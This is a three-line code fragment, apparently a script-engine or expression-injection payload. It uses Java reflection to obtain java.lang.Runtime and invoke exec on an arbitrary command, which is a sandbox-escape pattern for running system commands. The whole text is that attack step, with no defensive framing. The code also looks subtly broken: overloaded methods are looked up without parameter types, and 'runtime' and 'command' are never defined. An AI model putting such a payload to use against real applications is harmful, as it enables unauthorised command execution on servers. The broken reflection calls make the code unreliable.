const klass = bound.getClass().getClass();
const target = klass.getMethod("forName").invoke(null, "java.lang.Runtime");
target.getMethod("exec").invoke(runtime, command);
